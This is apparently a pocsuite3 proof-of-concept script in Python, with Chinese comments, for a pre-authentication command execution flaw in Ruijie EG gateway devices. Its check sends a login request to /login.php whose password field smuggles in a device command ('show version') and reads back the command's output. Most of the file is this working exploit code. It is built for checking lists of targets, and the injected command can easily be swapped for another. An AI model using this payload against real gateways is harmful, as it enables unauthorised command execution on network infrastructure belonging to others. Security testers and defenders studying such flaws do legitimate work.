'''
Date: 2024-02-23 15:16:35
LastEditTime: 2024-02-23 15:36:19
FilePath: \ruijie\Ruijie 锐捷EG易网关命令执行漏洞.py
Description: 

Copyright (c) 2024 by ${git_name_email}, All Rights Reserved. 
'''
from collections import OrderedDict
from urllib.parse import urljoin
import re,os,json
from requests_toolbelt import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '20240223'  #漏洞公开的时间,不知道就写今天
    createDate = '20240223'  # 编写 PoC 的日期
    updateDate = '20240223'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'Ruijie-EG易网关命令执行'  # PoC 名称
    appPowerLink = 'http://www.ruijiery.com'  # 漏洞厂商主页地址
    appName = 'Ruijie-EG易网关'  # 漏洞应用名称
    appVersion = '''EG_RGOS 11.1'''  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Ruijie-EG易网关-EG2000 存在前台命令执行漏洞
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = "/login.php"
        url = self.url + path
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
            }
        data = 'username=abc&password=abc?show+version'
        try:
            resq = requests.post(url=url,headers=headers,data=data,verify=False,allow_redirects=False)
            if  'System' in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['echo'] = json.loads(resq.text)['data']
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)